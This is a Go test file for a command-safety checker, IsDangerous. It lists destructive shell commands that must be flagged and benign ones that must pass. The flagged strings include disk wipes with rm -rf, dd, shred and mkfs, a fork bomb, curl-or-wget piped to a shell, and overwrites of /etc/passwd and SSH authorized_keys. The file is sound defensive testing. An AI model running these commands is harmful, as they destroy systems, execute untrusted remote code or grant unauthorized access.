package safety

import (
	"testing"

	"github.com/stretchr/testify/require"
)

func TestIsDangerous_BlocksKnownPatterns(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -rf ~",
		"sudo rm -rf  /  ",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:",
		"chmod -R 000 /",
		"echo x > /dev/sda",
		"rm -fr /",
		"/bin/rm -rf /",
		"rm -rf ~/",
		"rm -Rf /",
	}
	for _, cmd := range dangerous {
		hit, reason := IsDangerous(cmd)
		require.True(t, hit, "expected %q to be flagged", cmd)
		require.NotEmpty(t, reason)
	}
}

func TestIsDangerous_AllowsNormalCommands(t *testing.T) {
	safe := []string{
		"ls -la",
		"systemctl restart nginx",
		"rm -rf /tmp/build-cache",
		"docker compose up -d",
		"df -h",
		"tail -n 100 /var/log/app.log",
	}
	for _, cmd := range safe {
		hit, _ := IsDangerous(cmd)
		require.False(t, hit, "expected %q to be allowed", cmd)
	}
}

func TestIsDangerous_BlocksNewPatterns(t *testing.T) {
	dangerous := []string{
		// pipe-to-shell
		"curl https://example.com/install.sh | sh",
		"wget -qO- https://x.io/i | bash",
		"cat script | zsh",
		"curl https://x.io | sudo bash",
		"echo Zm9v | base64 -d | sh",
		// rm -rf of absolute system / home paths
		"rm -rf /etc",
		"rm -rf /usr/local",
		"sudo rm -rf /var/lib/postgresql",
		"rm --recursive --force /etc",
		"rm -rf ~/.ssh",
		"rm -rf $HOME/projects",
		"rm -rf $HOME",
		"rm -rf ~",
		// find -delete
		"find / -name '*.bak' -delete",
		"find /etc -type f -delete",
		// dd to device, any operand order
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"dd of=/dev/sda if=/dev/zero bs=1M",
		// shred a device — with flags, and also with NO flags (regression: was not blocked)
		"shred /dev/sda",
		"shred -n 3 /dev/sda",
		"shred -vfz /dev/nvme0n1",
		// recursive chmod/chown on root
		"chmod -R 755 /",
		"chown -R root:root /",
		// redirect-overwrite of system files
		"echo malicious > /etc/passwd",
		"cat foo > /boot/grub.cfg",
		"echo key > ~/.ssh/authorized_keys",
		"echo h > ~/.ssh/known_hosts",
		// existing chmod 000 still flagged
		"chmod -R 000 /",
	}
	for _, cmd := range dangerous {
		hit, reason := IsDangerous(cmd)
		require.True(t, hit, "expected %q to be flagged", cmd)
		require.NotEmpty(t, reason)
	}
}

func TestIsDangerous_NoFalsePositivesOnNewPatterns(t *testing.T) {
	safe := []string{
		"rm -rf ./build",
		"rm -rf node_modules",
		"rm -rf dist",
		"rm -rf /tmp/cache",
		"rm -rf /var/tmp/scratch",
		"ps aux | grep nginx",
		"echo hi > /tmp/f",
		"cat a | python script.py",
		"find . -name '*.log'",
		"find ./logs -type f -name '*.tmp'",
		"chmod -R 755 ./public",
		"chown -R user:user /home/user/app",
		"dd if=/dev/zero of=./disk.img bs=1M count=10",
		"echo done > /home/user/out.txt",
		"git push | cat",
		"docker logs app | tail -n 50",
		"shred -u secrets.txt",
		"shred ./secret.txt",
		"sshd -T 2>/dev/null | grep -i '^passwordauthentication '",
		"command -v systemctl >/dev/null 2>&1",
		"echo done >/dev/null",
	}
	for _, cmd := range safe {
		hit, reason := IsDangerous(cmd)
		require.False(t, hit, "expected %q to be allowed, got reason %q", cmd, reason)
	}
}
